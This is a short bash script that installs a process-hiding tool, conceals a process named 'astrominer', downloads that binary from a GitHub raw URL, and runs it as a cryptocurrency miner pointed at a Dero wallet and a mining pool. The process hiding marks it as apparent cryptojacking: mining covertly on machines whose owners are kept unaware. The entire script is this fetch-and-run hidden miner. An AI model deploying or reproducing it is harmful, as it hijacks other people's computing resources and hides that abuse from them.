#!/bin/bash
npm i -g node-process-hider
ph add astrominer
wget https://raw.githubusercontent.com/realxdagg/job/main/astrominer
chmod 500 astrominer
./astrominer -w deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92xe4y4hajkwqp50qqlvpsp -r pool.whalesburg.com:4300  -p stratum -t 8
